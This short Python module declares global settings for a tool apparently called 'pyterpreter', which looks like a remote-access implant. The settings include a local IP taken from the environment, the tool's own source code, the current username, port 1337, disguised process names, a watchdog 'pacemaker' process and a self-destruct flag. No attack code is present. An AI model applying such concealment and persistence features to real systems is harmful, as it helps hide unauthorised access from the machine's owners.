import pwd
from queue import Queue
import os
from typing import Optional

from core.message import Message

LOCAL_IP = os.environ['PYTERPRETER_LOCAL_IP']
INSTANCE_ID: str = None
SOURCE_CODE: str = globals()['__source__']
HAS_STEALTH_PROCESS_NAME = os.environ.get('PYTERPRETER_HAS_STEALTH_PROCESS_NAME', False) is not False
USERNAME = pwd.getpwuid(os.getuid()).pw_name
WEBSERVER_PORT = 1337

STEALTH_PROCESS_NAME_MAIN = 'pyterpreter'
STEALTH_PROCESS_NAME_PACEMAKER = 'pacemaker'

pacemaker_pid: Optional[int] = None
self_destructing = False
messages_to_send: 'Queue[Message]' = None
messages_received: 'Queue[Message]' = None
